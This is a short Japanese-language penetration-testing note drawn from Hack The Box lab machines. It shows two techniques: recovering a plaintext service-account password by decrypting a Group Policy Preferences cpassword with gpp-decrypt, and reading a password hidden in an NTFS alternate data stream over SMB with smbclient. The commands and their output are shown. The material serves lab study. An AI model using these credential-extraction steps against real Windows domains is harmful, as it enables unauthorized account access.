# Attack
----

## cpassword
* **MS14-025以**前は、**SYSVOL**以下にグループポリシーファイルが配置されていることがあった
* 前記グループポリシーファイルには**cpassword**と呼ばれる、暗号化されたパスワードが保存されていることがあった
* 暗号化されたパスワードは[gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt)で復号可能
* Htb: Active

  ```console
  ┌─[rio@parrot]─[~/Htb/Active]
  └──╼ $cat Groups.xml
  <?xml version="1.0" encoding="utf-8"?>
  <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
  </Groups>
  ┌─[rio@parrot]─[~/Htb/Active]
  └──╼ $gpp-decrypt/gpp-decrypt.py  -f Groups.xml
  
                                 __                                __
    ___ _   ___    ___  ____ ___/ / ___  ____  ____  __ __   ___  / /_
   / _ `/  / _ \  / _ \/___// _  / / -_)/ __/ / __/ / // /  / _ \/ __/
   \_, /  / .__/ / .__/     \_,_/  \__/ \__/ /_/    \_, /  / .__/\__/
  /___/  /_/    /_/                                /___/  /_/
  
  [ * ] Username: active.htb\SVC_TGS
  [ * ] Password: GPPstillStandingStrong2k18
  ```

## Alternative Data Stream
* NTFSファイルシステムでは、ファイルに任意のメタ情報を付与可能
* 前記メタ情報を代替データストリームと呼ぶ
* Htb: Nest

  ```console
  ┌─[rio@parrot]─[~/Htb/Nest]
  └──╼ $smbclient -U c.smith //nest.htb/Users
  Enter WORKGROUP\c.smith's password:
  Try "help" to get a list of possible commands.
  smb: \> cd C.Smith
  smb: \C.Smith\> cd "HQK Reporting"
  smb: \C.Smith\HQK Reporting\> ls
    .                                   D        0  Fri Aug  9 08:06:17 2019
    ..                                  D        0  Fri Aug  9 08:06:17 2019
    AD Integration Module               D        0  Fri Aug  9 21:18:42 2019
    Debug Mode Password.txt             A        0  Fri Aug  9 08:08:17 2019
    HQK_Config_Backup.xml               A      249  Fri Aug  9 08:09:05 2019
  
                  10485247 blocks of size 4096. 6543087 blocks available
  smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt"
  altname: DEBUGM~1.TXT
  create_time:    金  8月  9 08時06分12秒 2019 JST
  access_time:    金  8月  9 08時06分12秒 2019 JST
  write_time:     金  8月  9 08時08分17秒 2019 JST
  change_time:    金  8月  9 08時08分17秒 2019 JST
  attributes: A (20)
  stream: [::$DATA], 0 bytes
  stream: [:Password:$DATA], 15 bytes
  smb: \C.Smith\HQK Reporting\> get "Debug Mode Password.txt:Password"
  getting file \C.Smith\HQK Reporting\Debug Mode Password.txt:Password of size 15 as Debug Mode Password.txt:Password (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
  smb: \C.Smith\HQK Reporting\>
  ```

  

